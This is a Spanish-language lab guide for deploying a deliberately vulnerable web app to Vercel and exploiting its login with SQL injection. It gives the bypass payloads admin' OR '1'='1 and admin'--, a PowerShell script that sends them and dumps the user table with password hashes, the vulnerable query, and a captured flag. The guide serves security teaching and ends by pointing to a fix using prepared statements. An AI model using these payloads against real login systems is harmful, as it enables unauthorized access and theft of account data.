# 📖 Guía Práctica de Pruebas: Inyección SQL (SQLi)

Esta guía detalla paso a paso cómo poner en marcha el laboratorio, cómo auditar la vulnerabilidad de **Inyección SQL** directamente desde **PowerShell**, qué resultados esperar y cómo capturar la bandera (*Flag*).

---

## 📌 Paso 1: Subir y Desplegar tu Laboratorio en Vercel

Para que el backend serverless de autenticación (`/api/login`) funcione en la nube con HTTPS:

1. **Abre PowerShell** en la carpeta del proyecto:
   ```powershell
   git add .
   git commit -m "Laboratorio enfocado exclusivamente en SQLi"
   git push origin main
   ```
2. Entra en tu navegador a [vercel.com/new](https://vercel.com/new).
3. Conecta tu cuenta de GitHub, selecciona el repositorio `lopezjesus-cyber/vul_web` y pulsa **Deploy**.
4. Copia tu URL pública asignada (ejemplo: `https://mi-laboratorio.vercel.app`).

> 💡 *Nota:* Si estás probando en local sin Vercel, la URL será `http://localhost:3000`.

---

## 📌 Paso 2: Ejecutar la Auditoría Automatizada en PowerShell

Puedes ejecutar el script automatizado para verificar el fallo de seguridad:

1. Abre tu terminal de **PowerShell**.
2. Ubícate en la carpeta del repositorio:
   ```powershell
   cd C:\Users\jesus\web_vul
   ```
3. Ejecuta el script contra tu URL de Vercel:
   ```powershell
   .\test-lab.ps1 -BaseUrl "https://vulweb-theta.vercel.app"
   ```

El script evaluará:
- El comportamiento normal ante credenciales erróneas (HTTP 401).
- La evasión mediante tautología (`admin' OR '1'='1`).
- La evasión mediante comentarios SQL (`admin'--`).
- Capturará la bandera y mostrará la consulta SQL generada internamente.

---

## 📌 Paso 3: Prueba Manual Paso a Paso desde PowerShell

Para entender la mecánica del ataque mediante peticiones HTTP nativas:

```powershell
# 1. Definir el payload malicioso
$payload = @{
    username = "admin' OR '1'='1"
    password = "cualquier_password"
} | ConvertTo-Json

# 2. Enviar la petición POST con Invoke-RestMethod
$res = Invoke-RestMethod -Uri "https://vulweb-theta.vercel.app/api/login" -Method Post -ContentType "application/json" -Body $payload

# 3. Ver el usuario autenticado y el token
$res | Format-List
$res.user | Format-List

# 4. Ver la tabla completa de usuarios extraída de la base de datos (accounts)
$res.database.records | Format-Table id, username, role, email, password_hash -AutoSize
```

### ¿Qué ocurre internamente?
La consulta vulnerable construida en el servidor es:
```sql
SELECT * FROM accounts WHERE username = 'admin' OR '1'='1' AND password_hash = 'cualquier_password' LIMIT 1;
```
Dado que `'1'='1'` siempre es verdadero (*tautología*), la condición se cumple sin importar la contraseña y la base de datos devuelve el primer usuario existente (`admin`) y expone los registros de la tabla `accounts`.

* **Bandera capturada:** `FLAG-SQLI{nexus_sql_injection_bypass_success}`
* **Token de sesión:** `nexus_admin_sess_9941a8e2`

---

## 📌 Paso 4: Validar en la Interfaz Web Gráfica

1. Abre tu navegador y accede a tu enlace: `https://vulweb-theta.vercel.app`.
2. Haz clic en **Acceder a la Consola** o en **Acceso a Clientes**.
3. En el formulario de inicio de sesión:
   - **Usuario:** `admin' OR '1'='1`
   - **Contraseña:** `loquesea`
4. Pulsa **Ingresar al Panel**.
5. Se abrirá la consola corporativa de administración mostrando:
   - La bandera de seguridad en rojo.
   - **La tabla interactiva `accounts` con todos los usuarios, roles, correos y hashes de contraseñas de la base de datos.**
   - La lista de servidores y estadísticas del clúster.

---

## 📌 Paso 5: Consultar la Guía de Remediación Defensiva

Para conocer la causa raíz en el código y el parche seguro para corregir esta debilidad:
* Consulta [GUIA_VULNERABILIDADES.md](file:///c:/Users/jesus/web_vul/GUIA_VULNERABILIDADES.md) para ver el ejemplo de consultas parametrizadas (*Prepared Statements*).
